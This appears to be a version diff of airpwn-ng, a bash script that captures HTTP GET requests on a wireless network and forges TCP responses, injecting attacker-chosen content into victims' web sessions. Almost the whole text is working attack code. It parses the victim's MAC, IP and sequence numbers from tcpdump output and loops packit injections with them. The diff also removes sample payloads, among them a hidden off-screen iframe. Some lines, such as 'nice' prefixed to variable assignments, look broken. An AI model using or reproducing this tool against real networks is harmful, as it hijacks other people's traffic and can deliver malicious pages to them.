@@ -2,7 +2,6 @@
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## Filename: airpwn-ng
-## Version:  1.0
 ## Copyright (C) <2015>  <stryngs>
 
 ##  This program is free software: you can redistribute it and/or modify
@@ -36,82 +35,63 @@
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 ## First and foremost, to God above for giving me the abilities I have, Amen.
 
-## toast and his excellent work with the original concept of airpwn.  airpwn-ng wouldn't exist without the original work done by him...
-## Thank you for allowing me to have the privilege of the original name.  I hope this script lives up to what it should be!
-
-## The "Community" for always working towards improving the existing.....
-
 ## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking.
 
-## blind for the excellent work at finding the wireshark URL that helped with parsing the GET / function for airpwn-ng
+## toast and his excellent work with the original concept of airpwn.  airpwn-ng wouldn't exist without the original work done by him...
+## Thank you for allowing me to have the privilege of the original name.  I hope this script lives up to what it should be!
 
 ## The wireshark community for it's excellent String Matching Capture Filter Generator
 	# https://www.wireshark.org/tools/string-cf.html
 
+## Jack64 for his excellent help and eagerness to improve this.  Thank you for the help mate...
+
+## blind for the excellent work at finding the wireshark URL that helped with parsing the GET / function for airpwn-ng
+
 ## xmnr for the idea to issue a nice of -20 throughout the script
+
+## The "Community" for always working towards improving the existing.....
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
-##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Inject File Ideas ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-## Ballsy
-# <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-# <html xmlns="http://www.w3.org/1999/xhtml">
-#   <head>
-#     <meta http-equiv="content-type" content="application/xhtml+xml; charset=iso-8859-1" />
-#     <title>Inject PWN</title>
-#     <meta content="hacking, hackers, pwn, packet-injection"
-#       name="keywords" />
-#     <meta content="Packet Injection 101" name="description" />
-#   </head>
-#   <body><iframe src="http://www.site.com"></iframe></body></html>
-
-## Covert
-# <div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">
-#  <iframe src="http://www.site.com"></iframe>
-# </div>
-##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-
-
-##~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Repetitious Functions ~~~~~~~~~~~~~~~~~~~~~~~##
-monitor--()
+##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Repetitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
+mon--()
 {
-LOGFILE=$2
-if [[ $1 == *"tap"* ]] #TAP INTERFACE ASSUMES DOT11DECRYPT IS IN USE AND USES HARDCODED VAR PARSING
-then
 	## src MAC -- Victim
-	vicmac=$(awk '{print $1}' $LOGFILE | cut -d: -f 1-)
+	nice -n 20 vicmac=$(awk -v i0="$i0" '{print $i0}' $LOGFILE | cut -d: -f 2-)
 	## src MAC -- Router LAN MAC
-	rtrmac=$(awk '{print $3}' $LOGFILE | cut -d: -f 1- | tr -d ',')
+	nice -n 20 rtrmac=$(awk -v i1="$i1" '{print $i1}' $LOGFILE | cut -d: -f 2-)
 	## src IP -- Victim
-	vicip=$(awk '{print $9}' $LOGFILE | cut -d. -f -4)
+	nice -n 20 vicip=$(awk -v i2="$i2" '{print $i2}' $LOGFILE | cut -d. -f -4)
 	## src port -- Victim
-	vicport=$(awk '{print $9}' $LOGFILE | cut -d. -f 5-)
+	nice -n 20 vicport=$(awk -v i2="$i2" '{print $i2}' $LOGFILE | cut -d. -f 5-)
 	## dst IP -- Server
-	svrip=$(awk '{print $11}' $LOGFILE | cut -d. -f -4)
+	nice -n 20 svrip=$(awk -v i3="$i3" '{print $i3}' $LOGFILE | cut -d. -f -4)
 	## svr port -- Server
-	svrport=$(awk '{print $11}' $LOGFILE | cut -d. -f 5- | tr -d ':')
+	nice -n 20 svrport=$(awk -v i3="$i3" '{print $i3}' $LOGFILE | cut -d. -f 5- | sed 's/://')
 	## sequence number + length
-	acknum=$(awk '{print $15}' $LOGFILE | cut -d: -f2 | sed 's/,//')
+	nice -n 20 acknum=$(awk -v i4="$i4" '{print $i4}' $LOGFILE | cut -d: -f2 | sed 's/,//')
 	## old acknowledgement number
-	seqnum=$(awk '{print $17}' $LOGFILE | sed 's/,//')
-else
+	nice -n 20 seqnum=$(awk -v i5="$i5" '{print $i5}' $LOGFILE | sed 's/,//')
+}
+
+tap--()
+{
 	## src MAC -- Victim
-	vicmac=$(awk -v i0="$i0" '{print $i0}' $LOGFILE | cut -d: -f 2-)
+	nice -n 20 vicmac=$(awk '{print $1}' $LOGFILE | cut -d: -f 1-)
 	## src MAC -- Router LAN MAC
-	rtrmac=$(awk -v i1="$i1" '{print $i1}' $LOGFILE | cut -d: -f 2-)
+	nice -n 20 rtrmac=$(awk '{print $3}' $LOGFILE | cut -d: -f 1- | tr -d ',')
 	## src IP -- Victim
-	vicip=$(awk -v i2="$i2" '{print $i2}' $LOGFILE | cut -d. -f -4)
+	nice -n 20 vicip=$(awk '{print $9}' $LOGFILE | cut -d. -f -4)
 	## src port -- Victim
-	vicport=$(awk -v i2="$i2" '{print $i2}' $LOGFILE | cut -d. -f 5-)
+	nice -n 20 vicport=$(awk '{print $9}' $LOGFILE | cut -d. -f 5-)
 	## dst IP -- Server
-	svrip=$(awk -v i3="$i3" '{print $i3}' $LOGFILE | cut -d. -f -4)
+	nice -n 20 svrip=$(awk '{print $11}' $LOGFILE | cut -d. -f -4)
 	## svr port -- Server
-	svrport=$(awk -v i3="$i3" '{print $i3}' $LOGFILE | cut -d. -f 5- | sed 's/://')
+	nice -n 20 svrport=$(awk '{print $11}' $LOGFILE | cut -d. -f 5- | tr -d ':')
 	## sequence number + length
-	acknum=$(awk -v i4="$i4" '{print $i4}' $LOGFILE | cut -d: -f2 | sed 's/,//')
+	nice -n 20 acknum=$(awk '{print $15}' $LOGFILE | cut -d: -f2 | sed 's/,//')
 	## old acknowledgement number
-	seqnum=$(awk -v i5="$i5" '{print $i5}' $LOGFILE | sed 's/,//')
-fi
+	nice -n 20 seqnum=$(awk '{print $17}' $LOGFILE | sed 's/,//')
 }
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
@@ -124,8 +104,8 @@ hdr="\033[1;34m" ## Headers
 inp="\033[36m"   ## Inputs
 wtf="\033[34m"   ## WTFs
 rst="\e[0m"      ## Reset
-current_ver=1.2
-rel_date="22 April 2015"
+current_ver=1.2.2
+rel_date="24 April 2015"
 
 if [[ "$UID" -ne 0 ]];then
         echo -e "$wrn\nMust be ROOT to run this script$rst"
@@ -133,70 +113,68 @@ if [[ "$UID" -ne 0 ]];then
 fi
 
 if [[ -z $1  || -z $2 || -z $3 ]]; then
-	if [ -z $2 ]; then
-		echo -e "$ins\nUsage: ./airpwn-ng <Inject File> <Sniff NIC> <Inject NIC> <Index Value>$rst"
-		echo -e "$ins\nUsage w/ dot11decrypt: ./airpwn-ng <Inject File> tap0 <Inject NIC>$rst"
-		exit 1	
-	else
-		if [ $2 -ne *"tap"* ]; then
-			if [ -z $4 ]; then
-				echo -e "$ins\nUsage: ./airpwn-ng <Inject File> <Sniff NIC> <Inject NIC> <Index Value>$rst"
-				echo -e "$ins\nUsage w/ dot11decrypt: ./airpwn-ng <Inject File> tap0 <Inject NIC>$rst"
-				exit 1
-			fi
-		else
-			echo -e "$ins\nUsage w/ dot11decrypt: ./airpwn-ng <Inject File> tap0 <Inject NIC>$rst"
-			exit 1
-		fi
-	fi
+	echo -e "$ins\nUsage: ./airpwn-ng <Inject File> <Sniff NIC> <Inject NIC> <Index Value>$rst"
+	echo -e "$ins\n-OR-$rst"
+	echo -e "$ins\nUsage: ./airpwn-ng <Inject File> <Tap NIC> <Inject NIC>$rst"
 fi
-
-## Make RAMFS for faster processing
-LOGFILE=/tmp/airpwn_ram/LOG
-DIR_EXISTS=$(ls -l /tmp/airpwn_ram | wc -l)
-if [ $DIR_EXISTS -gt 0 ]
-then
-TMPFS_MOUNTED=$(df -h | grep tmpfs | grep airpwn | wc -l)
-if [ $TMPFS_MOUNTED -eq 1 ]
-then
-	echo "[*] RAMFS Mounted"
-else
-	mount -t tmpfs -o size=10M tmpfs /tmp/airpwn_ram
-	echo "[*] RAMFS Mounted"
-	fi
-else
-mkdir /tmp/airpwn_ram
-TMPFS_MOUNTED=$(df -h | grep tmpfs | grep airpwn | wc -l)
-if [ $TMPFS_MOUNTED -eq 1 ]
-then
-	echo "[*] RAMFS Mounted"
-else
-	mount -t tmpfs -o size=10M tmpfs /tmp/airpwn_ram
-	echo "[*] RAMFS Mounted"
-	fi
-fi
-
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
 
 
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ MAIN ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
-## Prepare the indexes
-index=$4
-i0=$(expr $index + 1)
-i1=$(expr $index + 2)
-i2=$(expr $index + 20)
-i3=$(expr $index + 22)
-i4=$(expr $index + 26)
-i5=$(expr $index + 28)
+## Make RAMFS for faster processing
+### Too tired to clean this up now, will case later...
+LOGFILE=/tmp/airpwn_ram/LOG
+DIR_EXISTS=$(ls -l /tmp/airpwn_ram | wc -l)
+if [[ $DIR_EXISTS -gt 0 ]]; then
+	TMPFS_MOUNTED=$(df -h | grep tmpfs | grep airpwn | wc -l)
+	if [ $TMPFS_MOUNTED -eq 1 ]; then
+		echo "[*] RAMFS Mounted"
+	else
+		mount -t tmpfs -o size=10M tmpfs /tmp/airpwn_ram
+		echo "[*] RAMFS Mounted"
+	fi
+
+else
+	mkdir /tmp/airpwn_ram
+	TMPFS_MOUNTED=$(df -h | grep tmpfs | grep airpwn | wc -l)
+	if [[ $TMPFS_MOUNTED -eq 1 ]]; then
+		echo "[*] RAMFS Mounted"
+	else
+		mount -t tmpfs -o size=10M tmpfs /tmp/airpwn_ram
+		echo "[*] RAMFS Mounted"
+	fi
+
+fi
+
 ## Prepare the hex inject string
 inject=$(echo "0x$(cat $1 | xxd -g1 -ps | fold -w2 | paste -sd ' ')")
 
-while true; do
-	nice -n 20 tcpdump -i $2 -c 1 -eKnSt 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 1>$LOGFILE &
-	nice -n 20 inotifywait -r -e modify $LOGFILE
-	monitor-- $2 $LOGFILE
-	
-	## inject the packet
-	nice -n 20 packit -i $3 -R -nnn -a $acknum -D $vicport -F PA -q $seqnum -S $svrport -d $vicip -s $svrip -X $rtrmac -Y $vicmac -p "$inject"
-done
+if [[ ! -z $4 ]];then
+	## Prepare the indexes
+	index=$4
+	i0=$(expr $index + 1)
+	i1=$(expr $index + 2)
+	i2=$(expr $index + 20)
+	i3=$(expr $index + 22)
+	i4=$(expr $index + 26)
+	i5=$(expr $index + 28)
+
+	while true; do
+		nice -n -20 tcpdump -i $2 -c 1 -eKnSt 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 1>$LOGFILE &
+		nice -n -20 inotifywait -r -e modify $LOGFILE
+		mon--
+		
+		## inject the packet
+		nice -n -20 packit -i $3 -R -nnn -a $acknum -D $vicport -F PA -q $seqnum -S $svrport -d $vicip -s $svrip -X $rtrmac -Y $vicmac -p "$inject"
+	done
+else
+	while true; do
+		nice -n -20 tcpdump -i $2 -c 1 -eKnSt 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420' 1>$LOGFILE &
+		nice -n -20 inotifywait -r -e modify $LOGFILE
+		tap--
+		
+		## inject the packet
+		nice -n -20 packit -i $3 -R -nnn -a $acknum -D $vicport -F PA -q $seqnum -S $svrport -d $vicip -s $svrip -X $rtrmac -Y $vicmac -p "$inject"
+	done
+fi
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
